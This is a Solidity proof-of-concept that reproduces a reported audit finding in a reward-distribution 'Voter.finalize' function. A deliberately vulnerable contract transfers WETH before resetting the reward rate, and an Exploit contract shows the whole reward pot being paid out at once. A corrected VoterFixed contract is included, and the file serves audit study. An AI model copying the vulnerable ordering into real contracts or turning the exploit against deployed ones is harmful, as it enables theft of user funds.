// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BMX Voter.finalize — WETH is transferred before setTokensPerInterval
    (Sherlock 0x73696d616f, H-8, September 2025).
    SYNTHETIC, cheatcode-free. run() does not warp. The block is already one
    week after the stored lastDistributionTime.
    Old rate is 1 ether per second. Pending is therefore 604800 ether, equal
    to this finalize's whole reward pot. Transferring WETH first lets
    distribute pay that pending out of the new deposit. The staker receives
    604800 ether immediately and the distributor is left at 0.
    Control calls setTokensPerInterval first. distribute sees an empty
    balance and pays 0. The WETH then sits on the distributor. */

contract Token {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Distributor {
    Token public rewardToken;
    address public tracker;
    uint256 public tokensPerInterval;
    uint256 public lastDistributionTime;

    constructor(Token rewardToken_) {
        rewardToken = rewardToken_;
    }

    function setTracker(address tracker_) external {
        tracker = tracker_;
    }

    function seed(uint256 rate, uint256 lastTime) external {
        tokensPerInterval = rate;
        lastDistributionTime = lastTime;
    }

    function pendingRewards() public view returns (uint256) {
        if (block.timestamp == lastDistributionTime) return 0;
        return tokensPerInterval * (block.timestamp - lastDistributionTime);
    }

    function setTokensPerInterval(uint256 amount) external {
        require(lastDistributionTime != 0, "RewardDistributor: invalid lastDistributionTime");
        Tracker(tracker).updateRewards();
        tokensPerInterval = amount;
    }

    function distribute() external returns (uint256) {
        require(msg.sender == tracker, "RewardDistributor: invalid msg.sender");
        uint256 amount = pendingRewards();
        if (amount == 0) return 0;

        lastDistributionTime = block.timestamp;
        uint256 balance = rewardToken.balanceOf(address(this));
        if (amount > balance) amount = balance;
        if (amount > 0) rewardToken.transfer(msg.sender, amount);
        return amount;
    }
}

contract Tracker {
    Token public rewardToken;
    Distributor public distributor;
    address public staker;

    constructor(Token rewardToken_, Distributor distributor_, address staker_) {
        rewardToken = rewardToken_;
        distributor = distributor_;
        staker = staker_;
    }

    function updateRewards() external {
        uint256 amount = distributor.distribute();
        if (amount > 0) rewardToken.transfer(staker, amount);
    }
}

contract Voter {
    uint256 public constant WEEK = 7 days;

    Token public WETH;
    Distributor public distributor;

    constructor(Token weth_, Distributor distributor_) {
        WETH = weth_;
        distributor = distributor_;
    }

    function finalize() external {
        uint256 toRewards = WETH.balanceOf(address(this));
        // @> VULN: WETH is sent before setTokensPerInterval, so distribute spends it at the old rate
        WETH.transfer(address(distributor), toRewards);
        distributor.setTokensPerInterval(toRewards / WEEK);
    }
}

contract VoterFixed {
    uint256 public constant WEEK = 7 days;

    Token public WETH;
    Distributor public distributor;

    constructor(Token weth_, Distributor distributor_) {
        WETH = weth_;
        distributor = distributor_;
    }

    function finalize() external {
        uint256 toRewards = WETH.balanceOf(address(this));
        distributor.setTokensPerInterval(toRewards / WEEK);
        WETH.transfer(address(distributor), toRewards);
    }
}

contract Exploit {
    uint256 public constant WEEK = 7 days;
    uint256 public constant RATE = 1 ether;

    Token public weth;
    Distributor public distributor;
    Tracker public tracker;
    Voter public voter;
    uint256 public paid;
    uint256 public left;

    constructor() {
        weth = new Token();
        distributor = new Distributor(weth);
        tracker = new Tracker(weth, distributor, address(this));
        voter = new Voter(weth, distributor);
        distributor.setTracker(address(tracker));
    }

    function run() external {
        require(block.timestamp > WEEK, "clock");
        uint256 pot = WEEK * RATE;
        weth.mint(address(voter), pot);
        distributor.seed(RATE, block.timestamp - WEEK);
        voter.finalize();
        paid = weth.balanceOf(address(this));
        left = weth.balanceOf(address(distributor));
        require(paid == pot, "staker was not paid the whole pot");
        require(left == 0, "distributor still holds WETH");
        require(distributor.pendingRewards() == 0, "pending remains");
    }
}
